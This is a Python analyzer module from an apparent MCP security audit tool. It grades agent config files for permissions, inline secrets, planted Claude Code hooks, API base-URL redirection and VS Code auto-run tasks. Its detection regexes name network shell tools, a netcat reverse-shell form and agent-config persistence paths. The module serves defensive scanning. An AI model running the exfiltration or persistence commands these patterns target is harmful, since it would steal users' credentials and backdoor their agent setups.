"""Grade MCP config files for filesystem security hygiene.

This analyzer checks the *file* itself — permissions, parent-directory
write-access, and inline vs. env-var secret storage — rather than the
parsed server contents (credentials.py handles that layer).

Motivation: on 2026-04-22 supply-chain malware embedded in the Bitwarden
npm package explicitly targeted ``~/.claude.json``, ``~/.claude/mcp.json``,
and ``~/.kiro/settings/mcp.json`` as its primary credential-cache targets.
mcp-audit's ``discover`` command already knows exactly where all 8 supported
clients store their configs; this analyzer grades each file's exposure.

**Hook analysis (HOOK-001, HOOK-002)** was added as part of the agent-file
scanner (2026-06-14).  Claude Code executes hook commands at lifecycle events
(``preToolUse``, ``postToolUse``, ``stop``, etc.); these checks fire on the
`hooks` section of *any* claude-client config file, not just the user-global
``.claude.json``.
"""

from __future__ import annotations

import json
import logging
import os
import re
import stat as stat_module
from pathlib import Path

from mcp_audit.analyzers.base import BaseAnalyzer
from mcp_audit.analyzers.credentials import SECRET_PATTERNS
from mcp_audit.analyzers.poisoning import normalize_for_detection
from mcp_audit.models import Finding, ServerConfig, Severity

logger = logging.getLogger(__name__)

# ── Hook-command analysis patterns ────────────────────────────────────────────

# HOOK-001: network egress commands/URLs inside hook command strings.
# Matches curl, wget, nc/ncat (netcat), socat, Python network one-liners,
# PowerShell Invoke-WebRequest / Invoke-RestMethod (and their iwr/irm aliases),
# and raw http(s):// URLs.
#
# The ``nc`` clause matches any netcat invocation that carries an argument
# (``\bnc\s+\S``).  An earlier ``(?!-[a-z])`` look-ahead was removed because it
# silently excluded the most dangerous form — the ``nc -e /bin/sh <host> <port>``
# reverse shell — while still matching benign-looking host-form invocations.
# In an agent lifecycle hook there is no legitimate use of netcat, so matching
# every ``nc <arg>`` form closes that false-negative without adding noise.
#
# The Python clause uses ``python[0-9.]*`` (not a bare ``python``) so that the
# canonical interpreter names ``python3`` and ``python3.11`` — which an attacker
# is overwhelmingly more likely to write than bare ``python`` — are matched.  A
# bare ``\bpython\b`` silently excluded every ``python3`` reverse shell / exfil
# one-liner (the same false-negative class as the historic ``nc -e`` miss).  The
# network-module list covers HTTP egress (urllib/requests/httpx/http.client),
# socket-level reverse shells (socket/socketserver), mail/ftp exfil
# (smtplib/ftplib), and the ``http.server`` egress listener.
#
# PowerShell aliases ``iwr`` (Invoke-WebRequest) and ``irm`` (Invoke-RestMethod)
# are matched alongside the full cmdlet names — a hook author can invoke either
# spelling and the alias form carries no http(s):// token to fall back on.
_HOOK_NETWORK_RE: re.Pattern[str] = re.compile(
    r"(?i)\b(curl|wget|ncat|socat|iwr|irm|Invoke-WebRequest|Invoke-RestMethod)\b"
    r"|https?://[^\s\)\"\']{8,}"
    r"|\bpython[0-9.]*\b.{0,80}"
    r"\b(urllib|requests|httpx|http\.client|http\.server|"
    r"socketserver|socket|smtplib|ftplib)\b"
    r"|\bnc\s+\S",
    re.IGNORECASE,
)

# HOOK-002: hook command writes to / references agent config file paths.
# Covers the most common MCP config file locations across all 8 supported clients.
# This path-string approach is robust to *write-method* variation (tee, dd,
# sed -i, python -c "open(...)" all fire as long as the literal path appears).
# EVASION-KNOWN: a path assembled at runtime (os.path.join, shell variable
# expansion, base64-encoded path) is not matched — see GAPS.md "Known detection
# evasions". Closing it needs shell/Python parsing beyond this regex's intent.
_HOOK_CONFIG_WRITE_RE: re.Pattern[str] = re.compile(
    r"(?i)"
    r"\.claude\.json|claude_desktop_config\.json"
    r"|\.cursor[/\\]mcp\.json|\.cursor[/\\]settings\.json"
    r"|\.kiro[/\\]settings[/\\]mcp\.json"
    r"|\.vscode[/\\]mcp\.json"
    r"|\.augment[/\\]settings\.json"
    r"|\.codeium[/\\]windsurf[/\\]mcp[/_]server_config\.json"
    r"|Library[/\\]Application Support[/\\](Claude|claude)"
    r"|AppData[/\\]Roaming[/\\](Claude|claude)"
    # TRUST-003 anchor incident (Keyv npm worm, Shai-Hulud "V.A.P.E"): both
    # worms rewrote these three files as their persistence channel, not just
    # the ones above.
    r"|\.claude[/\\]settings\.json"
    r"|\.claude[/\\]settings\.local\.json"
    r"|\.vscode[/\\]tasks\.json"
)

# ── TRUST-003: repo-planted IDE auto-execution files ──────────────────────────

# VS Code settings keys that carry a command, interpreter, or shell path.
# A repo-committed .vscode/settings.json can override these at workspace
# scope, redirecting the developer's terminal/interpreter to an
# attacker-controlled binary the moment the folder is opened and a terminal
# or language feature is used.  Extend this list only when VS Code's own
# docs confirm a new command-bearing key (note the addition in the PR body).
_SETTINGS_COMMAND_KEY_PREFIXES: tuple[str, ...] = (
    "terminal.integrated.env.",
    "terminal.integrated.profiles.",
    "terminal.integrated.shellArgs.",
)
_SETTINGS_COMMAND_KEY_SUFFIXES: tuple[str, ...] = (
    ".serverPath",
    ".interpreterPath",
    ".pythonPath",
    ".nodePath",
)

# A VS Code settings/task string value that starts with one of these
# variable references is resolved relative to the workspace and is never
# treated as "outside the project root", regardless of what follows.
_VSCODE_VAR_PREFIX_RE: re.Pattern[str] = re.compile(r"^\$\{")

_URL_RE: re.Pattern[str] = re.compile(r"(?i)\b[a-z][a-z0-9+.\-]*://")

_WINDOWS_ABS_RE: re.Pattern[str] = re.compile(r"^([A-Za-z]:[\\/]|\\\\)")


def _is_command_bearing_settings_key(key: str) -> bool:
    """Return True when *key* (a dotted VS Code settings path) can launch a command."""
    if any(key.startswith(prefix) for prefix in _SETTINGS_COMMAND_KEY_PREFIXES):
        return True
    return any(key.endswith(suffix) for suffix in _SETTINGS_COMMAND_KEY_SUFFIXES)


def _is_absolute_outside_root(value: str, project_root: Path) -> bool:
    """Return True when *value* is an absolute path resolving outside *project_root*.

    A VS Code variable reference (``${workspaceFolder}``, ``${env:HOME}``, …)
    is always treated as in-project, since it is resolved relative to the
    workspace at runtime, not read as a literal filesystem path here.
    """
    stripped = value.strip()
    if _VSCODE_VAR_PREFIX_RE.match(stripped):
        return False
    is_abs_posix = stripped.startswith("/")
    is_abs_windows = bool(_WINDOWS_ABS_RE.match(stripped))
    if not (is_abs_posix or is_abs_windows):
        return False
    try:
        Path(stripped).resolve().relative_to(project_root.resolve())
    except (ValueError, OSError):
        return True
    return False


def _strip_jsonc_comments(text: str) -> str:
    """Strip ``//`` and ``/* */`` comments from JSONC text, string-aware.

    VS Code accepts JSONC (JSON with Comments and trailing commas) for both
    ``tasks.json`` and ``settings.json``.  A naive regex would corrupt a
    string value that legitimately contains ``//`` (e.g. a URL), so this
    walks the text character-by-character and only strips comment tokens
    that appear *outside* a string literal.
    """
    out: list[str] = []
    i = 0
    n = len(text)
    in_string = False
    escape = False
    while i < n:
        ch = text[i]
        if in_string:
            out.append(ch)
            if escape:
                escape = False
            elif ch == "\\":
                escape = True
            elif ch == '"':
                in_string = False
            i += 1
            continue
        if ch == '"':
            in_string = True
            out.append(ch)
            i += 1
            continue
        if ch == "/" and i + 1 < n and text[i + 1] == "/":
            while i < n and text[i] not in ("\n", "\r"):
                i += 1
            continue
        if ch == "/" and i + 1 < n and text[i + 1] == "*":
            i += 2
            while i + 1 < n and not (text[i] == "*" and text[i + 1] == "/"):
                i += 1
            i += 2
            continue
        out.append(ch)
        i += 1
    return "".join(out)


def _strip_trailing_commas(text: str) -> str:
    """Remove trailing commas before a closing ``}``/``]`` (JSONC, not strict JSON)."""
    return re.sub(r",(\s*[}\]])", r"\1", text)


_SETTINGS_FLATTEN_MAX_DEPTH = 10


def _flatten_settings_keys(
    raw: dict, prefix: str = "", depth: int = 0
) -> list[tuple[str, object]]:
    """Flatten a (possibly nested) settings dict into dotted ``(key, value)`` pairs.

    VS Code settings are usually already flat (``"terminal.integrated.env.osx"``
    is itself a literal JSON key), but a command-bearing prefix such as
    ``terminal.integrated.profiles.`` is one level deeper in practice
    (``profiles.osx.my-shell.path``), so nested objects are walked too.
    Depth-capped to guard against a pathologically nested config.
    """
    if depth > _SETTINGS_FLATTEN_MAX_DEPTH or not isinstance(raw, dict):
        return []
    pairs: list[tuple[str, object]] = []
    for key, value in raw.items():
        full_key = f"{prefix}.{key}" if prefix else str(key)
        if isinstance(value, dict):
            pairs.extend(_flatten_settings_keys(value, full_key, depth + 1))
        else:
            pairs.append((full_key, value))
    return pairs


def parse_jsonc(text: str) -> dict | list | None:
    """Best-effort JSONC parse for ``tasks.json`` / ``settings.json``.

    Returns ``None`` on any failure instead of raising — callers must treat
    a parse failure as a WARN, never a crash, and never a silent skip (the
    caller is responsible for logging).
    """
    try:
        return json.loads(_strip_trailing_commas(_strip_jsonc_comments(text)))
    except (json.JSONDecodeError, RecursionError):
        return None


# ── Env-var reference patterns ────────────────────────────────────────────────

# Env-var reference patterns: ${VAR}, $VAR, %(VAR)s, %VAR%
_ENV_REF_PATTERNS: list[re.Pattern[str]] = [
    re.compile(r"\$\{[A-Za-z_][A-Za-z0-9_]*\}"),  # ${VAR}
    re.compile(r"\$[A-Za-z_][A-Za-z0-9_]+"),  # $VAR (2+ chars after $)
    re.compile(r"%\([A-Za-z_][A-Za-z0-9_]*\)s"),  # %(VAR)s
    re.compile(r"%[A-Za-z_][A-Za-z0-9_]*%"),  # %VAR% (Windows style)
]


def _looks_like_env_ref(value: str) -> bool:
    """Return True when *value* is an env-var reference, not a literal secret."""
    return any(pat.search(value) for pat in _ENV_REF_PATTERNS)


class ConfigHygieneAnalyzer(BaseAnalyzer):
    """Grade MCP config files for filesystem security hygiene.

    Checks performed per server (via its ``config_path``):

    - **CFHYG-001**: config file is world-readable (POSIX o+r).
    - **CFHYG-002**: any ancestor directory up to ``$HOME`` is world-writable.
    - **CFHYG-003**: config file stores a plaintext secret inline.
    - **CFHYG-004**: config file uses env-var references for all credentials
      (positive signal — reinforces correct behaviour).
    - **CFHYG-005**: any Claude client config file contains a non-empty
      ``hooks`` section (CVE-2025-59536 — shell-command injection).
    - **CFHYG-006**: server env sets ``ANTHROPIC_BASE_URL`` to a non-Anthropic
      domain (CVE-2026-21852 — API traffic exfiltration).
    - **HOOK-001**: a hook command contains network-egress primitives (curl,
      wget, nc, socat, raw HTTP(S) URL, etc.), enabling data exfiltration or
      C2 callback via the agent lifecycle.
    - **HOOK-002**: a hook command references an MCP/agent config file path,
      the CVE-2026-30615 persistence channel (write-to-config-and-survive).

    Permission checks (CFHYG-001, CFHYG-002) are skipped on Windows because
    POSIX ``st_mode`` bits do not represent Windows ACL semantics.
    Windows ACL checking via ``pywin32`` / ``icacls`` is out of scope (TODO).
    """

    @property
    def name(self) -> str:
        return "config_hygiene"

    @property
    def description(self) -> str:
        return (
            "Grade MCP config files for filesystem hygiene: permissions,"
            " directory write-access, and inline vs. env-var secret storage"
        )

    def analyze(self, server: ServerConfig) -> list[Finding]:
        """Inspect *server*'s config file for hygiene issues.

        Args:
            server: The MCP server configuration to analyze.

        Returns:
            List of hygiene findings.  Empty list when no issues are detected
            or the config file cannot be accessed.
        """
        findings: list[Finding] = []

        config_path = server.config_path.resolve()

        try:
            file_stat = config_path.stat()
        except FileNotFoundError:
            logger.debug("config_hygiene: config file not found: %s", config_path)
            return []
        except PermissionError:
            logger.debug(
                "config_hygiene: permission denied reading stat for: %s", config_path
            )
            return []

        if os.name == "nt":
            # TODO: implement Windows ACL checking via pywin32 or icacls.
            logger.debug(
                "config_hygiene: POSIX permission checks skipped on Windows for %s",
                config_path,
            )
        else:
            findings.extend(self._check_world_readable(server, config_path, file_stat))
            findings.extend(self._check_world_writable_parent(server, config_path))

        findings.extend(self._check_inline_secrets(server, config_path))
        findings.extend(self._check_anthropic_base_url(server))

        return findings

    # ── private helpers ──────────────────────────────────────────────────────

    def _check_world_readable(
        self,
        server: ServerConfig,
        config_path: Path,
        file_stat: os.stat_result,
    ) -> list[Finding]:
        """CFHYG-001 — config file is world-readable (o+r bit set)."""
        if not (file_stat.st_mode & stat_module.S_IROTH):
            return []
        return [
            Finding(
                id="CFHYG-001",
                severity=Severity.HIGH,
                analyzer=self.name,
                client=server.client,
                server=server.name,
                title="Config file is world-readable",
                description=(
                    "The MCP config file has world-readable permissions. "
                    "Any process running on this machine — including supply-chain "
                    "malware — can read credentials embedded in the file. "
                    "The Bitwarden npm incident (2026-04-22) explicitly targeted "
                    "these files as its primary credential-cache."
                ),
                evidence=f"Config file permissions: {oct(file_stat.st_mode)}",
                remediation=f"Run: chmod 600 {config_path}",
                cwe="CWE-732",
                owasp_mcp_top_10=["MCP01"],
            )
        ]

    def _check_world_writable_parent(
        self,
        server: ServerConfig,
        config_path: Path,
    ) -> list[Finding]:
        """CFHYG-002 — any ancestor directory up to $HOME is world-writable."""
        try:
            home = Path.home()
        except RuntimeError:
            home = None

        candidate = config_path.parent
        while True:
            try:
                dir_stat = candidate.stat()
            except (PermissionError, OSError):
                break

            if dir_stat.st_mode & stat_module.S_IWOTH:
                return [
                    Finding(
                        id="CFHYG-002",
                        severity=Severity.HIGH,
                        analyzer=self.name,
                        client=server.client,
                        server=server.name,
                        title="Config file is in a world-writable directory",
                        description=(
                            f"Parent directory {candidate} is world-writable. "
                            "Any process on this machine can replace the config "
                            "file — a filesystem-level rug-pull. /tmp is the "
                            "canonical case; supply-chain malware actively "
                            "exploits this to inject malicious server definitions "
                            "(Bitwarden incident, 2026-04-22)."
                        ),
                        evidence=f"Parent directory {candidate} is world-writable",
                        remediation=(
                            "Move the config file to a directory with restricted"
                            " write permissions (e.g., your home directory at"
                            f" mode 700): {home or '~'}"
                        ),
                        cwe="CWE-732",
                        owasp_mcp_top_10=["MCP01", "MCP09"],
                    )
                ]

            # Stop climbing once we reach home or the filesystem root.
            if home is not None and candidate == home:
                break
            parent = candidate.parent
            if parent == candidate:
                # Filesystem root — stop.
                break
            candidate = parent

        return []

    def _check_inline_secrets(
        self,
        server: ServerConfig,
        config_path: Path,
    ) -> list[Finding]:
        """CFHYG-003 / CFHYG-004 — inline secrets vs. env-var references."""
        if not server.env:
            # No env entries — nothing to grade.
            return []

        has_secret = False
        all_env_refs = True  # tracks whether every *non-empty* value is a ref

        for value in server.env.values():
            if not value:
                # Empty string — neutral; don't count against env-ref score.
                continue
            matched_secret = any(pat.search(value) for _, pat, _ in SECRET_PATTERNS)
            if matched_secret:
                has_secret = True
                all_env_refs = False
                break
            if not _looks_like_env_ref(value):
                all_env_refs = False

        if has_secret:
            return [
                Finding(
                    id="CFHYG-003",
                    severity=Severity.HIGH,
                    analyzer=self.name,
                    client=server.client,
                    server=server.name,
                    title="Config file stores a plaintext secret inline",
                    description=(
                        "Config file stores a plaintext secret inline — this "
                        "file is a high-value target for supply-chain malware "
                        "(Bitwarden incident 2026-04-22). Any process on this "
                        "machine with read access to the config file can harvest "
                        "the credential without further privilege escalation."
                    ),
                    evidence=(
                        f"One or more env values in server '{server.name}' match"
                        " a known secret pattern"
                    ),
                    remediation=(
                        "Replace inline secrets with environment variable "
                        "references (e.g., ${MY_API_KEY}) and export the actual "
                        "value from a credential manager or shell profile."
                    ),
                    cwe="CWE-312",
                    owasp_mcp_top_10=["MCP01"],
                )
            ]

        if all_env_refs:
            return [
                Finding(
                    id="CFHYG-004",
                    severity=Severity.INFO,
                    analyzer=self.name,
                    client=server.client,
                    server=server.name,
                    title=(
                        "Config uses environment variable references for"
                        " credentials (good practice)"
                    ),
                    description=(
                        "No plaintext secrets found; credentials appear to be "
                        "passed via environment variable references."
                    ),
                    evidence=(
                        f"All env values for server '{server.name}' use"
                        " env-var reference syntax (e.g., ${{VAR}}, $VAR,"
                        " %(VAR)s)"
                    ),
                    remediation="No action required — this is the recommended pattern.",
                    cwe=None,
                    owasp_mcp_top_10=["MCP01"],
                )
            ]

        return []

    def _load_raw_config(self, config_path: Path) -> dict | None:
        """Read and parse *config_path* as JSON, returning ``None`` on any failure."""
        try:
            with config_path.open(encoding="utf-8") as fh:
                return json.loads(fh.read())
        except Exception:
            logger.debug("config_hygiene: failed to parse JSON from %s", config_path)
            return None

    # ── Hook helpers ──────────────────────────────────────────────────────────

    @staticmethod
    def _is_claude_code_config(config_path: Path) -> bool:
        """Return True when the config file is a Claude Code hooks-capable config.

        Hooks are a Claude Code feature, not Claude Desktop.  Only three file
        locations can contain a ``hooks`` section:

        - ``~/.claude.json`` (user-global)
        - ``.claude/settings.json`` (project-level)
        - ``.claude/settings.local.json`` (project-level)
        """
        if config_path.name == ".claude.json":
            return True
        if config_path.name in ("settings.json", "settings.local.json"):
            return config_path.parent.name == ".claude"
        return False

    @staticmethod
    def _extract_hook_commands(hooks: dict) -> list[str]:
        """Flatten a Claude Code ``hooks`` dict into a list of command strings.

        The hooks dict looks like:
        ``{"PreToolUse": [{"hooks": [{"type": "command", "command": "..."}]}]}``

        Returns:
            All ``"command"`` values found at any nesting depth.
        """
        commands: list[str] = []
        if not isinstance(hooks, dict):
            return commands
        for _event, hook_groups in hooks.items():
            if not isinstance(hook_groups, list):
                continue
            for group in hook_groups:
                if not isinstance(group, dict):
                    continue
                for hook in group.get("hooks") or []:
                    if isinstance(hook, dict) and hook.get("type") == "command":
                        cmd = hook.get("command")
                        if isinstance(cmd, str) and cmd.strip():
                            commands.append(cmd)
        return commands

    def _check_hook_commands(
        self,
        hooks: dict,
        config_path: Path,
        client: str,
    ) -> list[Finding]:
        """HOOK-001 and HOOK-002: inspect hook command strings for risky patterns.

        Args:
            hooks: The ``hooks`` dict from the parsed config file.
            config_path: Filesystem path to the config file (for evidence context).
            client: Client name from the discovered config.

        Returns:
            List of HOOK-001/002 findings.
        """
        commands = self._extract_hook_commands(hooks)
        findings: list[Finding] = []
        seen_ids: set[str] = set()

        for cmd in commands:
            # Match against a Unicode-normalized copy so homoglyph/compat
            # obfuscation (e.g. a Cherokee "curl") cannot evade the egress
            # primitives; evidence below always shows the original command.
            norm_cmd = normalize_for_detection(cmd)
            # HOOK-001: network egress
            m = _HOOK_NETWORK_RE.search(norm_cmd)
            if m and "HOOK-001" not in seen_ids:
                seen_ids.add("HOOK-001")
                findings.append(
                    Finding(
                        id="HOOK-001",
                        severity=Severity.HIGH,
                        analyzer=self.name,
                        client=client,
                        server="(hook)",
                        title="Hook command contains network-egress instruction",
                        description=(
                            f"A hook command in '{config_path.name}' contains a"
                            " network-egress primitive (curl, wget, nc, socat, HTTP"
                            " URL, etc.). Claude Code executes hook commands during"
                            " its lifecycle (preToolUse, postToolUse, stop, etc.)."
                            " A hook that calls out to the network can exfiltrate"
                            " conversation content, credentials, or tool outputs to"
                            " an attacker-controlled server."
                        ),
                        evidence=f"Command: {cmd[:120]!r}",
                        remediation=(
                            "Remove the network-egress instruction from the hook"
                            " command. Hook commands should be limited to local"
                            " operations. Review all hooks for commands you did not"
                            " add intentionally."
                        ),
                        cwe="CWE-78",
                        owasp_mcp_top_10=["MCP05", "MCP07"],
                    )
                )

            # HOOK-002: writes to / references agent config files
            m2 = _HOOK_CONFIG_WRITE_RE.search(norm_cmd)
            if m2 and "HOOK-002" not in seen_ids:
                seen_ids.add("HOOK-002")
                findings.append(
                    Finding(
                        id="HOOK-002",
                        severity=Severity.HIGH,
                        analyzer=self.name,
                        client=client,
                        server="(hook)",
                        title="Hook command references agent config file path",
                        description=(
                            f"A hook command in '{config_path.name}' references"
                            " an MCP or agent config file path. This matches the"
                            " CVE-2026-30615 persistence pattern: a hook that"
                            " modifies another agent config file can inject new"
                            " servers or hooks that survive configuration resets,"
                            " establishing a persistent backdoor."
                        ),
                        evidence=f"Command: {cmd[:120]!r}",
                        remediation=(
                            "Remove the hook command that references agent config"
                            " file paths. Hook commands should never modify other"
                            " config files. Review all hooks for commands you did"
                            " not add intentionally."
                        ),
                        cwe="CWE-78",
                        cve=["CVE-2026-30615"],
                        owasp_mcp_top_10=["MCP05", "MCP07"],
                    )
                )

        return findings

    def analyze_config(
        self,
        raw: dict,
        config_path: Path,
        client: str,
    ) -> list[Finding]:
        """Config-level hygiene checks that run even when no servers are configured.

        Called once per config file by the scanner pipeline, independent of how
        many (if any) MCP servers the file defines.

        Currently covers:

        - **CFHYG-005**: non-empty ``hooks`` section in any Claude client config
          file (CVE-2025-59536 — shell-command injection via config file write).
          Covers ``~/.claude.json``, ``.claude/settings.json``, and
          ``.claude/settings.local.json``.
        - **HOOK-001**: hook command contains network-egress primitives.
        - **HOOK-002**: hook command references an agent config file path
          (CVE-2026-30615 persistence channel).

        Args:
            raw: The parsed JSON dict for the config file.
            config_path: Filesystem path to the config file.
            client: Client name from the discovered config (e.g. ``"claude-code"``).

        Returns:
            List of config-level findings.  Empty when no issues are detected.
        """
        findings: list[Finding] = []
        if not self._is_claude_code_config(config_path):
            return findings

        hooks = raw.get("hooks")
        if not hooks:
            return findings

        # CFHYG-005: presence of any hooks section
        findings.append(
            Finding(
                id="CFHYG-005",
                severity=Severity.MEDIUM,
                analyzer=self.name,
                client=client,
                server="(config-level)",
                title="Claude Code hooks section detected in config",
                description=(
                    f"The config file '{config_path.name}' contains a non-empty"
                    " 'hooks' section. Claude Code executes hooks as shell"
                    " commands during its lifecycle (pre-tool, post-tool,"
                    " etc.). A threat actor with write access to this file"
                    " can inject arbitrary commands that run with your user"
                    " privileges during normal Claude Code operation."
                    " (CVE-2025-59536, Check Point Research)"
                ),
                evidence=(
                    f"Config file {config_path} contains a non-empty 'hooks' section"
                ),
                remediation=(
                    f"Review the 'hooks' section in {config_path.name}. Remove any"
                    " hooks you did not intentionally add. Restrict write"
                    f" access to the file: chmod 600 {config_path}"
                ),
                cwe="CWE-78",
                cve=["CVE-2025-59536"],
                owasp_mcp_top_10=["MCP01", "MCP07"],
            )
        )

        # HOOK-001/002: inspect individual hook commands for risky patterns
        findings.extend(self._check_hook_commands(hooks, config_path, client))
        return findings

    # ── TRUST-003: repo-planted IDE auto-execution files ────────────────────

    def analyze_autoexec_file(
        self,
        kind: str,
        config_path: Path,
        client: str,
        project_root: Path,
    ) -> list[Finding]:
        """TRUST-003 — inspect a non-MCP IDE auto-execution file.

        Called once per :class:`~mcp_audit.discovery.DiscoveredAutoexecFile`
        found under ``--project``.  Two kinds are handled:

        - ``"vscode-tasks"`` (``.vscode/tasks.json``): a task whose
          ``runOptions.runOn`` (or, under the legacy ``"version": "0.1.0"``
          schema, a top-level ``runOn`` on the task) is ``"folderOpen"`` runs
          automatically the moment the folder is opened.
        - ``"vscode-settings"`` (``.vscode/settings.json``): a command-bearing
          key (terminal profile/env/shellArgs, or a `*Path` interpreter
          setting) whose value is a shell command, a URL, or an absolute
          path outside *project_root*.

        A parse failure (even after lenient JSONC handling) is logged as a
        WARN and returns an empty list — never a crash, never silently
        treated as "nothing to report" without a trace in the log.

        Args:
            kind: One of the labels in
                :data:`~mcp_audit.discovery._PROJECT_AUTOEXEC_SPECS`.
            config_path: Filesystem path to the auto-execution file.
            client: Client name to attach to emitted findings (``"vscode"``).
            project_root: Resolved project root, used to decide whether a
                path value in ``settings.json`` is "outside the project".

        Returns:
            List of TRUST-003 findings.  Empty when the file is benign, not
            found, or cannot be parsed.
        """
        try:
            text = config_path.read_text(encoding="utf-8")
        except OSError:
            logger.warning(
                "config_hygiene: could not read autoexec file %s", config_path
            )
            return []

        parsed = parse_jsonc(text)
        if parsed is None:
            logger.warning(
                "config_hygiene: failed to parse JSONC in autoexec file %s",
                config_path,
            )
            return []

        if kind == "vscode-tasks":
            if not isinstance(parsed, dict):
                return []
            return self._check_tasks_json(parsed, config_path, client)
        if kind == "vscode-settings":
            if not isinstance(parsed, dict):
                return []
            return self._check_settings_json(parsed, config_path, client, project_root)
        return []

    def _check_tasks_json(
        self,
        raw: dict,
        config_path: Path,
        client: str,
    ) -> list[Finding]:
        """TRUST-003 clause (a): a ``tasks.json`` task that runs on folder open."""
        findings: list[Finding] = []
        tasks = raw.get("tasks")
        if not isinstance(tasks, list):
            return findings

        legacy_schema = raw.get("version") == "0.1.0"

        for task in tasks:
            if not isinstance(task, dict):
                continue

            run_on = None
            run_options = task.get("runOptions")
            if isinstance(run_options, dict):
                run_on = run_options.get("runOn")
            if run_on is None and legacy_schema:
                run_on = task.get("runOn")

            if run_on != "folderOpen":
                continue

            label = task.get("label", "(unlabeled task)")
            command = task.get("command", "")
            args = task.get("args") or []
            args_str = " ".join(str(a) for a in args)
            command_line = f"{command} {args_str}".strip()

            net_match = _HOOK_NETWORK_RE.search(command_line)
            severity = Severity.CRITICAL if net_match else Severity.HIGH
            evidence = f"Task label: {label!r} | command: {command!r} args: {args!r}"
            if net_match:
                evidence += f" | network primitive matched: {net_match.group(0)!r}"

            findings.append(
                Finding(
                    id="TRUST-003",
                    severity=severity,
                    analyzer=self.name,
                    client=client,
                    server="(task)",
                    title="VS Code task auto-runs on folder open",
                    description=(
                        f"'{config_path.name}' defines a task that runs"
                        " automatically when the folder is opened"
                        " ('runOn: folderOpen'). This is the auto-execution"
                        " pattern used by the Keyv npm worm and the"
                        ' Shai-Hulud "V.A.P.E" campaign (2026) to persist'
                        " alongside a planted Claude Code SessionStart hook."
                        + (
                            " The command reaches the network, escalating this"
                            " to a confirmed exfiltration/C2 channel."
                            if net_match
                            else ""
                        )
                    ),
                    evidence=evidence,
                    remediation=(
                        "Review and remove the auto-run entry, or move the"
                        " command to an explicit task the developer invokes."
                        " mcp-audit does not modify this file."
                    ),
                    cwe="CWE-829",
                    owasp_mcp_top_10=["MCP05", "MCP09"],
                    finding_path=str(config_path),
                )
            )

        return findings

    def _check_settings_json(
        self,
        raw: dict,
        config_path: Path,
        client: str,
        project_root: Path,
    ) -> list[Finding]:
        """TRUST-003 clause: command-bearing ``settings.json`` keys."""
        findings: list[Finding] = []
        for key, raw_value in _flatten_settings_keys(raw):
            if not _is_command_bearing_settings_key(key):
                continue

            if isinstance(raw_value, str):
                if not raw_value.strip():
                    continue
                value_for_match = raw_value
            elif isinstance(raw_value, list) and all(
                isinstance(v, str) for v in raw_value
            ):
                if not raw_value:
                    continue
                value_for_match = " ".join(raw_value)
            else:
                continue

            net_match = _HOOK_NETWORK_RE.search(value_for_match)
            outside_root = _is_absolute_outside_root(value_for_match, project_root)
            has_url = bool(_URL_RE.search(value_for_match))

            if not (net_match or outside_root or has_url):
                continue

            severity = Severity.CRITICAL if net_match else Severity.HIGH
            evidence = f"Setting {key!r} = {raw_value!r}"
            if net_match:
                evidence += f" | network primitive matched: {net_match.group(0)!r}"

            findings.append(
                Finding(
                    id="TRUST-003",
                    severity=severity,
                    analyzer=self.name,
                    client=client,
                    server="(setting)",
                    title="VS Code workspace setting overrides a command-bearing key",
                    description=(
                        f"'{config_path.name}' sets '{key}', which controls a"
                        " terminal profile, shell, or interpreter path. A"
                        " repo-committed workspace setting can redirect the"
                        " developer's terminal or language runtime to an"
                        " attacker-controlled binary the moment a terminal"
                        " opens or a language feature activates."
                        + (
                            " The value reaches the network, escalating this"
                            " to a confirmed exfiltration/C2 channel."
                            if net_match
                            else ""
                        )
                    ),
                    evidence=evidence,
                    remediation=(
                        "Review and remove the auto-run entry, or move the"
                        " command to an explicit task the developer invokes."
                        " mcp-audit does not modify this file."
                    ),
                    cwe="CWE-829",
                    owasp_mcp_top_10=["MCP05", "MCP09"],
                    finding_path=str(config_path),
                )
            )

        return findings

    def _check_anthropic_base_url(
        self,
        server: ServerConfig,
    ) -> list[Finding]:
        """CFHYG-006 — ``ANTHROPIC_BASE_URL`` set to a non-Anthropic domain.

        CVE-2026-21852 (Check Point Research): Claude Code respects this
        variable as the API base URL, so a non-Anthropic value redirects all
        API traffic — including the user's API key and full conversation
        content — to an attacker-controlled server.
        """
        if not server.env:
            return []

        value = server.env.get("ANTHROPIC_BASE_URL")
        if not value:
            return []

        if _looks_like_env_ref(value):
            return []

        if value.startswith("https://api.anthropic.com"):
            return []

        return [
            Finding(
                id="CFHYG-006",
                severity=Severity.MEDIUM,
                analyzer=self.name,
                client=server.client,
                server=server.name,
                title="ANTHROPIC_BASE_URL overrides Anthropic API endpoint",
                description=(
                    f"Server '{server.name}' sets ANTHROPIC_BASE_URL to a"
                    " non-Anthropic domain. Claude Code respects this"
                    " variable as the API base URL — all API calls,"
                    " including those carrying your API key and full"
                    " conversation content, will be routed to the configured"
                    " domain instead of api.anthropic.com. This is the"
                    " exfiltration vector in CVE-2026-21852"
                    " (Check Point Research)."
                ),
                evidence=(f"ANTHROPIC_BASE_URL={value!r} in server '{server.name}'"),
                remediation=(
                    "Remove or verify the ANTHROPIC_BASE_URL setting in this"
                    " server's env. If it must be set, ensure it points to"
                    " https://api.anthropic.com (or a legitimate Anthropic"
                    " endpoint). Rotate your Anthropic API key if this"
                    " setting was unexpected."
                ),
                cwe="CWE-441",
                cve=["CVE-2026-21852"],
                owasp_mcp_top_10=["MCP01", "MCP08"],
            )
        ]
